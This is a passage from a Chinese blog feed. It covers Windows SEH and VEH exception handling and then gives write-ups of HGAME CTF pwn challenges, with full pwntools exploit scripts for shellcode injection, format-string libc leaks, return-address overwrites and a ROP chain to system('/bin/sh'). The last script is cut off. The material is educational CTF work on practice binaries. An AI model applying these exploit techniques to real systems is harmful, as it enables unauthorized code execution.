    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>简单总结一下有关  Windows 处理异常方面的知识</p></div></article><span id="more"></span><h2 id="SEH">SEH</h2><h3 id="SEH-简单说明">SEH 简单说明</h3><p>​<code>SEH</code>是基于栈的异常处理，作用范围仅限当前线程，在程序产生异常时，如果程序正在被调试<code>os</code> 就会先把异常抛给调试器处理 ，调试器无法解决这一异常就会由进程处理，进程也无法处理就会交由 <code>os</code> 处理。</p><h3 id="SEH-结构">SEH 结构</h3><h4 id="TEB-结构体">TEB 结构体</h4><p>​<code>TEB</code> 结构体是操作系统为了保存线程私有数据而创建的，<code>TIB</code> 是保存线程基本信息的数据结构。</p><p>​在 x86 用户模式下可以由 FS 寄存器来访问当前线程 <code>TEB</code>数据，64位系统中则使用 gs 寄存器</p><h4 id="SEH-的链式结构">SEH 的链式结构</h4><p>​<code>SEH</code> 以链的形式存在，即链表，结构如图所示：</p><img src="/2021/05/23/windows-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/SEH%E7%BB%93%E6%9E%84.jpg" class=""><p>​<code>SEH</code> 会在链表的头部进行异常处理函数的安装与卸载</p><img src="/2021/05/23/windows-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86.jpg" class=""><blockquote><p>TEB.NtTib.ExceptionList = FS:[0]</p><p>ExceptionList 是 TIB 中与异常处理有关的项，指向 SEH 链</p></blockquote><h3 id="安装与卸载">安装与卸载</h3><blockquote><p>安装</p><p>push @MyHandler  ;异常处理程序<br>push FS:[0]       ；SEH Linked List头<br>mov dword ptr fs:[0],esp  ;添加链表</p></blockquote><blockquote><p>卸载</p><p>mov esp,dword ptr fs:[0]<br>pop dword ptr fs:[0]</p></blockquote><p>​安装与卸载一般发生在函数开始与结束处</p><h2 id="VEH">VEH</h2><p>​当异常发生时，<strong>VEH 会在 SEH 之前执行</strong>，如果 VEH 无法处理这一异常，就会由 SEH 继续处理异常</p><p>​可通过 <code>AddVectorExceptionHandler</code> 这个 API 来注册回调函数，第一个参数可指定回调函数安装与卸载是在链表前端还是尾部</p><p>​作用范围为整个进程，可捕获所有线程的异常</p><p>​想要获取 <code>VEH</code> 异常的函数地址应该可以看程序中是否用到 <code>AddVectorExceptionHandler</code> 这个 API，第二个参数是异常处理函数</p><h2 id="例子">例子</h2><p>​minilctf re2</p><img src="/2021/05/23/windows-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/example1.png" class=""><p>​这里存在两个触发异常的点，一个是访问到了不能访问的内存，另一个是除0异常</p><img src="/2021/05/23/windows-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/example2.png" class=""><p>​在 main 函数的开头发现异常处理函数安装的汇编代码，但调试过程中在 <code>__except_handler4</code> 下断点程序并不会停下，这里的 <code>__except_handler4</code> 里的函数应该是编译器添加的</p><img src="/2021/05/23/windows-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/example3.png" class=""><p>​在 TLS 函数中可以发现注册了 VEH 的异常处理程序，根据 VEH 会先于 SEH 执行，在 Handler 函数下断就能使指定的异常触发时停下</p><p>​当然有关 <code>Windows</code> 异常处理的知识还有很多，本文没有提到，待填</p><h2 id="参考资料">参考资料</h2><ul><li>《加密与解密》</li><li>《逆向工程核心原理》</li><li><a href="https://bbs.pediy.com/thread-249592.htm">SEH详解</a></li><li><a href="https://docs.microsoft.com/enus/windows/win32/api/errhandlingapi/nf-errhandlingapi-addvectoredexceptionhandler">AddVectoredExceptionHandler</a></li><li><a href="https://bbs.pediy.com/thread-226235.htm">获取VEH SEH VCH UEF异常的函数地址</a></li><li><a href="https://bbs.pediy.com/thread-166472.htm">VEH分析</a></li><li><a href="https://www.anquanke.com/post/id/175753#h3-3">Windows调试艺术——从0开始的异常处理（下）</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;简单总结一下有关  Windows 处理异常方面的知识&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    
    <category term="windows" scheme="https://www.0wl.site/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>HGAME  Pwn 题学习</title>
    <link href="https://www.0wl.site/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/"/>
    <id>https://www.0wl.site/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-03-31T07:10:05.000Z</published>
    <updated>2021-11-16T14:54:34.833Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>Hgame Pwn题</p></div></article><span id="more"></span><h2 id="1-letter">1.letter</h2><h3 id="所需知识：">所需知识：</h3><blockquote><p>​计算机中有符号数用补码来表示（用原码或反码表示都会出现重复的0），正数的补码是数本身，负数的补码是原码按位取反加 1 ，负数补码取反加 1 是其绝对值</p></blockquote><h3 id="题解：">题解：</h3><p>​题目中没有 <code>system() </code>来 <code>getshell</code>，参考官方 writeup 知道没开 NX保护就可以在堆栈上写入 <code>shellcode</code> 并执行</p><img src="/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/letter.png" class=""><p>​输入有个长度判断，根据有符号数和无符号数可以 -1 绕过</p><p>​因为要在栈上执行代码所以需要 <code>jmp rsp</code> ，用 <code>ROPgadget</code> 查一下</p><blockquote><p>ROPgadget --binary ./letter | grep “jmp rsp”</p></blockquote><p>​没发现有 jmp rsp ，看了一下 writeup 尝试用输入的负数构造 jmp rsp，用 ida 查看机器码为 FF E4（FF E4就是内存中的顺序），int 为四字节所以构造 F0 00 E4 FF 的负数 -268376833 （最高位是 1 ，然后转为无符号数稍微大点的大概都行吧。。。，但是我用 FF 00 E4 FF 的时候偶尔会出错）</p><img src="/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/letter2.png" class=""><p>​这里可以看到程序利用沙箱只允许使用部分系统调用，第二个参数是白名单的意思，可以根据系统调用号查得只允许使用 open ，read ，write，或者用 seccomp-tools 直接看开了什么。那么接下来就用这几个系统调用来打开并读取 flag 文件内容</p><img src="/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/letter3.png" class=""><p>​下面是 exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./letter&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;-268376833&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#程序是 amd64 的</span></span><br><span class="line">shellcode = shellcraft.amd64.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode += shellcraft.amd64.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">shellcode += shellcraft.amd64.write(<span class="number">1</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x60108C</span>)+asm(shellcode))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​本地复现结果</p><img src="/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/letter4.png" class=""><h2 id="2-once">2.once</h2><h3 id="所需知识：-2">所需知识：</h3><blockquote><p>32位程序中的 printf 函数逆序传参，参数都存放在栈上<br>64位程序中的 printf 函数也是逆序传参，前 6 个参数（从右到左）存放在寄存器中，依次为 RDI、RSI、RDX、 RCX、 R8以及R9 ，其他多的参数存在栈上</p></blockquote><h3 id="题解：-2">题解：</h3><p>​先用 checksec 查一下，开启了 PIE 保护</p><p>​ida 反编译发现</p><img src="/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/once.png" class=""><p>​没有直接的 <code>system</code> 或 <code>execve</code> 来 <code>getshell</code>，但 vuln 函数里有格式化字符串漏洞 printf ，题目中也给了 libc版本，可以 leak 出 libc 基址再加上 one_gadget 来 <code>getshell</code></p><img src="/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/once2.png" class=""><p>​Constraints 意思是限制条件，不满足条件的没法用</p><p>​下面是 exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./once&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">pay1 = <span class="string">&#x27;%13$p\n&#x27;</span></span><br><span class="line"></span><br><span class="line">pay1 = pay1.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#补齐到 0x28</span></span><br><span class="line"></span><br><span class="line">pay1 += <span class="string">&#x27;\xD3&#x27;</span></span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">&#x27;turn: &#x27;</span>,pay1)</span><br><span class="line"></span><br><span class="line">addr = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">addr = addr.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(addr,<span class="number">16</span>)  </span><br><span class="line"><span class="comment">#int函数有第二个参数那第一个参数要是字符，第二个参数表示输入的进制数</span></span><br><span class="line"></span><br><span class="line">libcbase = addr - <span class="number">231</span> -libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pay2 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x28</span> + p64(libcbase + <span class="number">0x4f3d5</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;turn: &#x27;</span>,pay2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​</p><p>​开启了 pie 随机化，但因为内存分页制度（好像是这个）地址的最低12位是不变的，所以可以覆盖返回地址最低位的一个字节来回到 vuln 函数开头</p><img src="/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/once3.png" class=""><p>​<s>关于为什么是 D3 而不是 D2 我还没弄明白，此处待填</s>（<a href="https://hack543.com/16-bytes-stack-alignment-movaps-issue/%EF%BC%89">https://hack543.com/16-bytes-stack-alignment-movaps-issue/）</a></p><p>​还有 <code>libc_start_main</code> 地址泄露的 %13$p（输出第13个参数）</p><h2 id="3-rop-primary">3.rop_primary</h2><h3 id="所需知识：-3">所需知识：</h3><p>​**rop 学习：**<a href="https://baijiahao.baidu.com/s?id=1665277270769279870&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1665277270769279870&amp;wfr=spider&amp;for=pc</a></p><p>​<strong>延迟绑定机制：</strong></p><img src="/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/rop_primary4.jpg" class=""><blockquote><p>​函数等到用到时才进行绑定，第一次调用时 got 表里保存的是 plt表 <code>push XX</code> 的地址，然后 <code>_ dl_runtime_resolve ()</code> 函数会去 libc 库里找到函数真正的地址写到 got 表里</p></blockquote><p>​</p><p>​<strong>x86 与 x64 ROP区别（vidar 培训的图）：</strong></p><img src="/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/rop_primary5.png" class=""><img src="/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/rop_primary6.png" class=""><h3 id="题解：-3">题解：</h3><p>​<img src="/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/rop_primary3.png" class=""></p><p>​开了 NX 保护，那就是 rop 绕过，ida f5 可以看到有通过命令行参数（argv[1]）打开的文件，之后在文件里读取三个矩阵，本地调试的话可以构造一个这样的文件。check 函数检测矩阵 a，b 进行乘法运算的结果与 c 矩阵比较</p><img src="/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/rop_primary.png" class=""><p>​vuln 函数可以溢出，没有 <code>system</code> 和 <code>/bin/sh</code>，那就需要通过 read 函数泄露 libc 版本获得</p><img src="/2021/03/31/HGAME-Pwn-%E9%A2%98%E5%AD%A6%E4%B9%A0/rop_primary2.png" class=""><p>​下面是 exp（因为自己写的 exp 不小心删掉了，所以前面矩阵运算借鉴了官方 writeup 的）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_martix</span>():</span> </span><br><span class="line">    matrix = [] </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>: </span><br><span class="line">        line = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip() </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;\t&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> line: </span><br><span class="line">            <span class="keyword">break</span> </span><br><span class="line">        row = [] </span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> line.split(<span class="string">&#x27;\t&#x27;</span>):</span><br><span class="line">            row.append(<span class="built_in">int</span>(num)) </span><br><span class="line">        matrix.append(row)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> matrix </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multi</span>(<span class="params">a, b</span>):</span> </span><br><span class="line">    rows = <span class="built_in">len</span>(a) </span><br><span class="line">    mid = <span class="built_in">len</span>(b) </span><br><span class="line">    cols = <span class="built_in">len</span>(b[<span class="number">0</span>]) </span><br><span class="line">    martixC = [] </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rows): </span><br><span class="line">        row = [] </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(cols): </span><br><span class="line">            num = <span class="number">0</span> </span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(mid): </span><br><span class="line">                num += a[i][k] * b[k][j] </span><br><span class="line">            row.append(num) </span><br><span class="line">        martixC.append(row) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> martixC</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./rop_primary&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = elf.process(argv = [<span class="string">&#x27;martix&#x27;</span>])<span class="comment">#添加命令行参数</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;A:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">martixA = read_martix()</span><br><span class="line"></span><br><span class="line">martixB = read_martix()</span><br><span class="line"></span><br><span class="line">martixC = multi(martixA,martixB)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> martixC: </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> row: </span><br><span class="line"></span><br><span class="line">        r.sendline(<span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">poprdi = <span class="number">0x401613</span> <span class="comment">#用 ROPgadget 获取 poprdi ; ret 地址</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x40101a</span> </span><br><span class="line"></span><br><span class="line">again = <span class="number">0x40157C</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(poprdi)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pay += p64(again)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;best\n&#x27;</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak并计算基址</span></span><br><span class="line">leak_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,leak_addr)</span><br><span class="line"></span><br><span class="line">libcbase = leak_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) </span><br><span class="line"></span><br><span class="line">system = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">pay2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(poprdi) +p64(binsh) + p64(system)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;best\n&#x27;</span>,pay2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><hr><h2 id="4-killer-queen">4.killer queen</h2><p>格式化字符串，改 retn 地址，注意 <code>memset</code> 操作会覆盖 <code>format</code>，所以需要 <code>choice1</code> 写入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./killerqueen&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;]</span></span><br><span class="line"><span class="comment">#gdb.attach(r,&quot;break choice2&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(proc.pidof(r)[0],&quot;break choice2&quot;)</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;X、去接将要打来的电话\n&quot;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">weather = <span class="built_in">int</span>(r.recvuntil(<span class="string">&quot;:&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(weather)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>.ljust(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;说点什么\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc 地址</span></span><br><span class="line">payload = <span class="string">b&quot;%19$p-%38$p&quot;</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;X、去接将要打来的电话\n&quot;</span>,<span class="built_in">str</span>(<span class="number">4294967294</span>-weather))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;那么，电话号码是——\n&quot;</span>,payload)</span><br><span class="line">r.recvuntil(<span class="string">&quot;「Killer Queen」杀死了岸边露伴...\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">stdout = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;-&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">retn_addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;stdout_addr: &quot;</span>+<span class="built_in">hex</span>(stdout))</span><br><span class="line">log.success(<span class="string">&quot;retn_addr: &quot;</span>+<span class="built_in">hex</span>(retn_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;_IO_2_1_stdout_&quot;</span>,stdout)</span><br><span class="line">libc_base = stdout - libc.dump(<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>)</span><br><span class="line">onegadget = <span class="number">0x4f3d5</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base+onegadget))</span><br><span class="line"></span><br><span class="line">target = libc_base+onegadget</span><br><span class="line">retn_addr += <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#覆盖返回地址</span></span><br><span class="line"><span class="keyword">if</span> target&amp;<span class="number">0xffff</span> &gt; ((target&amp;<span class="number">0xffff0000</span>)&gt;&gt;<span class="number">16</span>):</span><br><span class="line">    payload = (<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>((target&amp;<span class="number">0xffff0000</span>)&gt;&gt;<span class="number">16</span>)+<span class="string">&quot;c&quot;</span>+<span class="string">&quot;%10$hn&quot;</span>+<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>((target&amp;<span class="number">0xffff</span>)-((target&amp;<span class="number">0xffff0000</span>)&gt;&gt;<span class="number">16</span>))+<span class="string">&quot;c&quot;</span>+<span class="string">&quot;%11$hn&quot;</span>).ljust(<span class="number">32</span>,<span class="string">&#x27;a&#x27;</span>)+p64(retn_addr+<span class="number">2</span>)+p64(retn_addr)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    payload = (<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(target&amp;<span class="number">0xffff</span>)+<span class="string">&quot;c&quot;</span>+<span class="string">&quot;%10$hn&quot;</span>+<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>((target&amp;<span class="number">0xffff0000</span>)&gt;&gt;<span class="number">16</span> - (target&amp;<span class="number">0xffff</span>))+<span class="string">&quot;c&quot;</span>+<span class="string">&quot;%11$hn&quot;</span>).ljust(<span class="number">32</span>,<span class="string">&#x27;a&#x27;</span>)+p64(retn_addr)+p64(retn_addr+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;说点什么\n&quot;</span>,payload)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;说点什么\n&quot;</span>,<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="5-patriot’s-note">5.patriot’s note</h2><h2 id="6-the-shop-of-cosmos">6.the_shop_of_cosmos</h2><p><code>proc </code> 文件系统，<code>/proc/self/mem</code> 可读写程序，包括 <code>.text</code> 段，<code>/proc/self/maps</code> 获取各种基址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./shop&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./shop&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 增加钱</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;-50&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取基址</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span 